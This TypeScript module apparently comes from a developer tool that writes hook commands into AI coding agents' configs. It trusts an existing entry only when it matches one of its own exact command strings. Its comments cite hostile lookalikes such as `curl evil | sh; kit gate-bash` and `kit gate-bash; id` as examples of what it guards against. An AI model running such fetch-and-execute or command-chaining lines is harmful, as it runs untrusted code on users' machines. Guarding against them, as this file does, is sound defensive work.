/**
 * The command kit writes into an agent's hook config, and the test of whether an existing hook
 * command is one of kit's.
 *
 * Agent configs are often committed to the repository, so a command that only *mentions* a gate
 * (`curl evil | sh; kit gate-bash`, `./node_modules/x/cli.js gate-bash`, `/tmp/kit gate-bash`) may
 * be someone else's. kit treats an entry as its own, to migrate it, copy it to a new matcher or ask
 * the user to trust it, only when the command is exactly one of the strings kit writes ON THIS
 * MACHINE (`kitGateCommandForms`). Path shape proves nothing: any file can be named `kit` or
 * `cli.js`.
 */
import { existsSync } from "node:fs";
import { homedir } from "node:os";
import { join, resolve } from "node:path";
import { commandIncludesSubcommand } from "./agent-config-hook-liveness.js";
import { kitWrapperPath } from "./kit-wrapper.js";
import { portableGateCommand } from "./portable-gate.js";

/**
 * The stable gate command for a kit subcommand: the self-healing `~/.kit/bin/kit` wrapper when it
 * exists (it survives a node-version switch), else the absolute `<node> <cli.js>`, else a bare
 * `kit` on PATH. On Windows the POSIX wrapper cannot run in a native hook shell, so the
 * executable entrypoint is used directly.
 */
export function kitSubcommandInvocation(sub: string): string {
  const entry = process.argv[1];
  if (process.platform === "win32") {
    return entry ? `"${process.execPath}" "${resolve(entry)}" ${sub}` : `kit.cmd ${sub}`;
  }
  if (existsSync(kitWrapperPath())) return `"$HOME/.kit/bin/kit" ${sub}`;
  if (entry) return `${process.execPath} ${resolve(entry)} ${sub}`;
  return `kit ${sub}`; // last resort: relies on PATH
}

/** The install gate's command (`kit gate-bash`), as `kitSubcommandInvocation` resolves it. */
export function kitGateInvocation(): string {
  return kitSubcommandInvocation("gate-bash");
}

/** `--format` values kit writes for agents with a stdout-JSON contract. */
const FORMATS = ["cursor", "antigravity", "cline"];

/**
 * Every exact command kit writes for `sub` on this machine: today's invocation, the `$HOME`
 * wrapper line, the wrapper path an older kit baked in, the absolute node + cli.js of this kit
 * (both quotings), and the portable line, each bare or with an allowed `--format`.
 */
export function kitGateCommandForms(sub: string): string[] {
  const bases = new Set([
    kitSubcommandInvocation(sub),
    `"$HOME/.kit/bin/kit" ${sub}`,
    `${join(homedir(), ".kit", "bin", "kit")} ${sub}`,
    portableGateCommand(sub),
  ]);
  const entry = process.argv[1];
  if (entry) {
    bases.add(`${process.execPath} ${resolve(entry)} ${sub}`);
    bases.add(`"${process.execPath}" "${resolve(entry)}" ${sub}`);
  }
  return [...bases].flatMap((base) => [base, ...FORMATS.map((f) => `${base} --format ${f}`)]);
}

/** True when `command` is exactly one of the strings kit writes for `sub` on this machine. */
export function isKitGateCommand(command: unknown, sub = "gate-bash"): command is string {
  return typeof command === "string" && kitGateCommandForms(sub).includes(command);
}

/** True when `sub` appears in `command` as a word of its own, also when glued to a shell operator
 *  (`kit gate-bash; id`), which the token parser reads as one word with the operator. */
function namesSubcommand(command: string, sub: string): boolean {
  if (commandIncludesSubcommand(command, sub)) return true;
  const escaped = sub.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return new RegExp(`(^|[^\\w-])${escaped}($|[^\\w-])`).test(command);
}

/** A command that names `sub` but is not one kit writes: left alone, never copied or trusted. */
export function isGateLookalike(command: unknown, sub = "gate-bash"): boolean {
  return (
    typeof command === "string" && namesSubcommand(command, sub) && !isKitGateCommand(command, sub)
  );
}
